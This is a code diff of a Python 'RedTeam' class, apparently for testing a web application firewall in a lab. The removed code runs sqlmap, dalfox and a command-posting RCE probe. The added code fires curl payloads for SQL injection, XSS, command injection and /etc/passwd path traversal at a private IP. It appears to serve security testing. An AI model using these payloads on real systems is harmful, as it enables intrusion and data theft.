@@ -1,59 +1,52 @@
 import subprocess
-import requests
 from log_manager import log_attack
 
 class RedTeam:
-    def sql_injection(self, target_url):
-        """Launches an SQL Injection attack and logs a cleaner result."""
-        command = f"sqlmap -u {target_url} --batch --dbs --forms --crawl=1"
 
-        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
-
-        log_output = []
-        for line in process.stdout:
-            clean_line = line.strip()
-            if clean_line:
-                print(clean_line)
-                log_output.append(clean_line)
-
-        process.wait()
-
-        # Extract important info instead of logging everything
-        filtered_output = [line for line in log_output if "Database" in line or "available databases" in line or "Type" in line or "Title" in line or "Payload" in line or "[*]" in line]
-        result_output = "\n".join(filtered_output) if filtered_output else "[INFO] No databases found."
-
-        log_attack("SQL Injection", target_url, result_output)
-        return result_output
-
-
-    def xss_attack(self, target_url):
-        """Uses DalFox to test for XSS vulnerabilities."""
+    def run_payload(self, command, name):
+        """Runs a curl-based payload, captures HTTP status and filters output for logging."""
         try:
-            command = f"dalfox url \"{target_url}?search='<script>alert('XSS')</script>\""
             result = subprocess.run(command, shell=True, capture_output=True, text=True)
+            full_output = result.stdout + "\n" + result.stderr
 
-            log_attack("XSS", target_url, result.stdout)
-            return result.stdout if result.stdout else "[FAILED] No XSS vulnerabilities found."
+            # Extract lines that include HTTP info or common status indicators
+            simplified_lines = []
+            for line in full_output.splitlines():
+                line = line.strip()
+                if any(keyword in line.lower() for keyword in [
+                    "http", "status", "403", "200", "500", "not found", "forbidden",
+                    "modsecurity", "error", "alert", "access denied"
+                ]):
+                    simplified_lines.append(line)
 
-        except Exception as e:
-            return f"[ERROR] {str(e)}"
+            simplified_output = "\n".join(simplified_lines) or "[INFO] No meaningful output found."
 
-
-    def rce_attack(self, target_url, command="id"):
-        """Attempts Remote Code Execution by sending a command to a vulnerable web form."""
-        try:
-            payload = {"cmd": command, "Submit": "Run"}  # Adjust form field names based on target
-            response = requests.post(target_url, data=payload)
-
-            if response.status_code == 200:
-                result = response.text
-            else:
-                result = f"[FAILED] RCE failed with status {response.status_code}"
-
-            log_attack("RCE", target_url, result)
-            return result
+            if name != "False Positive":
+                log_attack(name, "172.26.204.72", command, simplified_output)
+            return simplified_output
 
         except Exception as e:
             return f"[ERROR] {str(e)}"
+
+
+    def sqli_basic(self):
+        payload = 'curl -i "http://172.26.204.72/index.html?user=admin%27%20OR%201%3D1--"'
+        return self.run_payload(payload, "SQLi")
+
+    def xss_basic(self):
+        payload = 'curl -i "http://172.26.204.72/index.html?q=<script>alert(\'XSS\')</script>"'
+        return self.run_payload(payload, "XSS")
+
+    def command_injection(self):
+        payload = 'curl -i -X POST "http://172.26.204.72/login" -d "username=admin;phpinfo();" -A "curl"'
+        return self.run_payload(payload, "CMDi")
+
+    def lfi_basic(self):
+        payload = 'curl -i "http://172.26.204.72/index.html?page=../../../../etc/passwd"'
+        return self.run_payload(payload, "LFI")
+
+    def false_positive(self):
+        payload = 'curl -i "http://172.26.204.72/index.html?contact=%22+SELECT+FROM+help"'
+        return self.run_payload(payload, "False Positive")
 
 red_team = RedTeam()
